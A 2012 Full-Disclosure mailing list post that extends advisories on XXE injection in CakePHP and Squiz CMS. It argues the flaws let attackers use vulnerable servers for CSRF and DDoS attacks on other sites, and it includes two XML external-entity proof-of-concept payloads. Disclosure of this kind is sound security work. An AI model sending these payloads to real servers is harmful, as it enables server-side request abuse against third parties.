
Date: Mon, 27 Aug 2012 23:40:03 +0300
From: "MustLive" <mustlive@...security.com.ua>
To: <full-disclosure@...ts.grok.org.uk>
Subject: XXE Injection in CakePHP and Squiz CMS

Hello!

I'm reminding my letter to Full-Disclosure list.

----- Original Message ----- 
From: "MustLive" <mustlive@...security.com.ua>
To: "Vladimir '3APA3A' Dubrovin" <3APA3A@...URITY.NNOV.RU>; 
<submissions@...ketstormsecurity.org>
Sent: Sunday, August 12, 2012 7:27 PM
Subject: XXE Injection in CakePHP and Squiz CMS


Hello!

I'll give you additional information concerning advisories CakePHP
2.x-2.2.0-RC2 XXE Injection (http://securityvulns.ru/docs28331.html) and
Squiz CMS Multiple Vulnerabilities (http://securityvulns.ru/docs28220.html).
It's about XXE Injection in CakePHP and Squiz CMS.

Similarly to earlier mentioned by me XXE Injection vulnerabilities in Zend
Framework and multiple Adobe products, in case of CakePHP and Squiz CMS it's
also possible to conduct attacks on other sites. CakePHP uses PHP SimpleXML
similarly as Zend Framework, so it's vulnerable to the same XXE Injection.
And in CakePHP advisory it's only mentioned about local file inclusion
attack vector, which is the most significant one. And in Squiz CMS advisory
it's also not mentioned about attack on other sites (only demonstrated PoC
for port scanning).

So I'll supplement advisories of Pawel Wylecial and Sense of Security, and
will bring your attention to another attack vector. Because I think that
this attack vector is also important.

I've wrote in my July's article "Using XML External Entities (XXE) for
attacks on other sites", which I've announced last week in WASC Mailing List
(http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2012-August/008481.html),
that XXE vulnerabilities could be used for attacks on other sites. Similarly
as Abuse of Functionality and Remote File Include holes, about which I've
wrote in my 2010's article "Using of the sites for attacks on other sites"
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-June/075384.html).
So in similar way XXE vulnerabilities can be used for conducting CSRF and
DoS attacks on other sites (and at using of multiple web sites it's possible
to conduct DDoS attacks). And in article "DDoS attacks via other sites
execution tool (DAVOSET)"
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-July/075622.html)
I've described efficiency of such attacks and the tool for their automation.

XXE (WASC-43):

For the attack it's needed to send the next XML data in POST request.

PoC for CakePHP:

<!DOCTYPE cakephp [
 <!ENTITY xxe SYSTEM "http://site/page" >]>
<request>
 <xxe>&xxe;</xxe>
</request>

PoC for Squiz CMS:

<!DOCTYPE scan [
 <!ENTITY xxe SYSTEM "http://site/page">]>
<scan>&xxe;</scan>

In total we have a lot of web applications and millions of web sites, which
can be used for attacks on other sites via different vulnerabilities (AoF,
RFI, XXE). So web developers also should draw attention to this attack
vector.

Best wishes & regards,
MustLive
Administrator of Websecurity web site
http://websecurity.com.ua 


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
